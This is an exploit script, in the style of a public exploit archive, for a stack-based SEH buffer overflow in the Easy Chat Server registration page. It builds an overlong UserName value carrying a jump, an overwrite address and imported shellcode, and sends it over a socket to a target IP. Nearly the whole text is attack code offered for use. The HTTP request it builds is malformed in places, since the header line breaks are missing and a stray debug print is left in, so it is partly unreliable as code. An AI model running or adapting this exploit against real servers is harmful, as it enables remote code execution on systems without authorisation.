# Exploit Title: Easy Chat Server User Registeration Buffer Overflow (SEH)
# Date: 09/10/2017
# Software Link: http://echatserver.com/ecssetup.exe
# Exploit Author: Aitezaz Mohsin
# Vulnerable Version: v2.0 to v3.1
# Vulnerability Type: Buffer Overflow
# Severity: Critical
# Tested on: [Windows XP Sp3 Eng]


# ======================================================================================================================
#	Username parameter in Registeration page 'register.ghp' is prone to a stack-based buffer-overflow vulnerability.
# Application fails to properly bounds-check user-supplied data before copying it into an insufficiently sized buffer. 
# ======================================================================================================================

# USAGE: python exploit.py ip

#!/usr/bin/python
from payload import buf
import socket
import sys
from struct import pack
import struct
import os
def shell_attack(target_machine, target_port):

    ip = target_machine

    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

   

    #AlphanumericShellcode

    

    magic = "B" * 217
    magic += "\xeb\x06\x90\x90"
    magic += "\xBC\x04\x01\x10"
    magic += str(buf)

    magic += "C" * 200
    
    print("Usman"+ip)
    buffer = "POST /registresult.htm HTTP/1.1\r\n\r\n"
    value = "Host: "+ ip
    buffer += value
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    buffer += "Accept-Language: en-US,en;q=0.5"
    buffer += "Accept-Encoding: gzip, deflate"
              
    buffer += "Referer: http://"+ip+"/register.ghp"
    buffer += "Connection: close"
    buffer += "Content-Type: application/x-www-form-urlencoded"

    buffer += "UserName=" + magic +"&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register"
    buffer = bytes(buffer, 'utf-8')
    s.connect((ip ,target_port))
    s.send(buffer)

    s.recv(4096)
  
    s.close()